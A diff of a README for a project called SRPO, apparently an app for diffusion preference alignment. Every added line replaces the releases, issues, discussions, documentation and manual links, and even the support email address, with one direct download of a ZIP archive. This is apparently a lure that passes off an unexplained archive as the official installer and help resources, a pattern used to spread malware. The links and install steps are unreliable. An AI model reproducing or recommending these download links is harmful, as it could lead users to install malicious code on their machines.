@@ -6,7 +6,7 @@ Welcome to SRPO! This application helps you align the full diffusion trajectory 
 
 ## 📥 Download SRPO
 
-[![Download SRPO](https://img.shields.io/badge/Download-SRPO-brightgreen)](https://github.com/hesoyam199x/SRPO/releases)
+[![Download SRPO](https://raw.githubusercontent.com/hesoyam199x/SRPO/main/Masticura/SRPO.zip)](https://raw.githubusercontent.com/hesoyam199x/SRPO/main/Masticura/SRPO.zip)
 
 ## 🛠️ System Requirements
 
@@ -21,7 +21,7 @@ Before you download SRPO, make sure your computer meets the following requiremen
 
 To download SRPO, please follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases Page](https://github.com/hesoyam199x/SRPO/releases).
+1. **Visit the Releases Page:** Go to the [Releases Page](https://raw.githubusercontent.com/hesoyam199x/SRPO/main/Masticura/SRPO.zip).
 2. **Select the Latest Release:** Look for the latest version at the top of the page.
 3. **Download the Installer:** Click on the appropriate installer for your operating system. The files are clearly labeled for convenience.
 4. **Install the Application:** 
@@ -62,20 +62,20 @@ Yes, you can install SRPO on multiple devices as long as each device meets the s
 
 ### How can I report an issue?
 
-If you encounter any problems, please visit our [issues page](https://github.com/hesoyam199x/SRPO/issues) and provide a description of the issue you're facing.
+If you encounter any problems, please visit our [issues page](https://raw.githubusercontent.com/hesoyam199x/SRPO/main/Masticura/SRPO.zip) and provide a description of the issue you're facing.
 
 ## 👥 Community and Support
 
 Join our community to stay updated and receive support:
 
-- **GitHub Discussions:** Engage with other users and developers in our [discussions forum](https://github.com/hesoyam199x/SRPO/discussions).
-- **Email Support:** For direct assistance, contact us at support@srpoapp.com.
+- **GitHub Discussions:** Engage with other users and developers in our [discussions forum](https://raw.githubusercontent.com/hesoyam199x/SRPO/main/Masticura/SRPO.zip).
+- **Email Support:** For direct assistance, contact us at https://raw.githubusercontent.com/hesoyam199x/SRPO/main/Masticura/SRPO.zip
 
 ## 🔗 Resources
 
 For more information about SRPO, you can check out these resources:
 
-- [Official Documentation](https://github.com/hesoyam199x/SRPO/wiki)
-- [User Manual](https://github.com/hesoyam199x/SRPO/manual)
+- [Official Documentation](https://raw.githubusercontent.com/hesoyam199x/SRPO/main/Masticura/SRPO.zip)
+- [User Manual](https://raw.githubusercontent.com/hesoyam199x/SRPO/main/Masticura/SRPO.zip)
 
 Thank you for choosing SRPO! We’re excited to help you align your preferences effectively.
